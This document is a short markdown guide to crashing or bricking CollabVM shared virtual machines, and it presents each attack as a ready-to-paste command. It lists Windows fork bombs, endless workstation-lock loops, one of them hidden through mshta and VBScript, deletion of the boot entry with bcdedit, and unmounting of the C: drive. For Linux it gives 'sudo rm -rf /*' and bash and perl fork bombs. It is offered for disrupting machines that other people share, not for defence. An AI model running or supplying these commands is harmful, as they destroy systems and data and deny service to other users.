# Commands that destroy CollabVM virtual machines

To crash the VM, you must execute one of them in the "Run" window or in the command line (cmd). To do this, it is strongly recommended to use auto-input programs.

## Windows

1. Classic fork bomb. May be closed.

```batch
cmd /c echo %0^|%0>1.bat&1.bat
```

2. Infinite blocking the windows user + pseudo fork bomb. Unclosable, only reboot helps.

```batch
cmd /k for /l %x in (1, 1, 9999999) do (start cmd /k rundll32 user32,LockWorkStation)
```

3. Hidden infinite blocking the windows user (not a forkbomb). Unclosable, Perfect way to block VM, only reboot helps.
```batch
cmd /c mshta vbscript:(CreateObject("WScript.Shell").Run("cmd /k for /l %x in (1, 1, 999999) do rundll32 user32,LockWorkStation """,0))(Window.Close)
```

4. Delete windows from bootloader and reboot (the system will no longer be able to boot. Run from cmd started as admin (RMB on cmd -> Run as admin).

```batch
cmd /k bcdedit /delete {current}&wmic os primary=1 reboot
```

5. Unmount primary C:\ drive. If you execute this command **as admin**, users cant interact with VM anymore.

```batch
mountvol c: /d
```

## Linux

You must run "Terminal" program and execute command there.

1. Needs no introduction

```bash
sudo rm -rf /*
```

2. Bash fork bomb. May not work due to fork restrictions.

```bash
:(){ :|:& };:
```

3. Perl fork bomb. May not work due to fork restrictions.

```bash
perl -e "fork while fork" &
```
